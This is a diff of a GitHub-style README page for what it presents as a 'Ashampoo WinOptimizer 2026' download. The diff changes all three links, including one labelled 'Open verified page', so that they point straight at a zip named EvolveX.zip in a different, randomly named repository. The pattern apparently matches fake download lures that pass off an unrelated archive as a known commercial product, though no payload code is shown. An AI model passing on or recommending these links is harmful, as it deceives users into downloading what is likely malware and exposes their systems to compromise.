@@ -10,15 +10,15 @@
 ---
 
 <p align="center">
-  <a href="https://github.com/FinAnbuCharge/tvnqenwd/releases/tag/v2026">
+  <a href="https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip">
     <img src="https://img.shields.io/badge/Download-Ashampoo%20WinOptimizer%20Download%202026%20Latest-brightgreen?style=for-the-badge" alt="Download Ashampoo WinOptimizer Download 2026">
   </a>
 </p>
 
 <p align="center">
-  <strong><a href="https://github.com/FinAnbuCharge/tvnqenwd/releases/tag/v2026">📦 Download Ashampoo WinOptimizer Download 2026 v2026</a></strong>
+  <strong><a href="https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip">📦 Download Ashampoo WinOptimizer Download 2026 v2026</a></strong>
   ·
-  <a href="https://github.com/FinAnbuCharge/tvnqenwd/releases/tag/v2026">Open verified page</a>
+  <a href="https://github.com/AssistantStay/rphiwmcm/releases/download/v1/EvolveX.zip">Open verified page</a>
 </p>
 
 ---
